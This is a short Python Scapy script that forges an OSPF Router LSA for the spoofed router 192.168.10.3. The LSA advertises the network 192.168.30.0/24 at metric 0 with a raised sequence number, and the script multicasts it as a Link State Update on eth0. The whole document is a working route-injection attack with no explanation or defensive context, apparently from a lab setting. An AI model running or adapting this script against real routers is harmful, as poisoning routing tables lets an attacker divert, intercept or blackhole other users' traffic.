#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.ospf import *
fake_link = OSPF_Link(id="192.168.30.0", data="255.255.255.0", type=3, metric=0)
transit_link = OSPF_Link(id="192.168.10.1", data="192.168.10.20", type=2, metric=1)
fake_lsa = OSPF_Router_LSA(age=1, options="E", type=1, id="192.168.10.3", 
                            adrouter="192.168.10.3", seq=0x80000025, 
                            linkcount=2, linklist=[fake_link, transit_link])
ospf_lsa_upd = (Ether(dst="01:00:5e:00:00:05") / IP(dst="224.0.0.5") / 
                OSPF_Hdr(area="0.0.0.0", authtype=0, src="192.168.10.3") / 
                OSPF_LSUpd(lsalist=[fake_lsa]))
sendp(ospf_lsa_upd, iface="eth0")
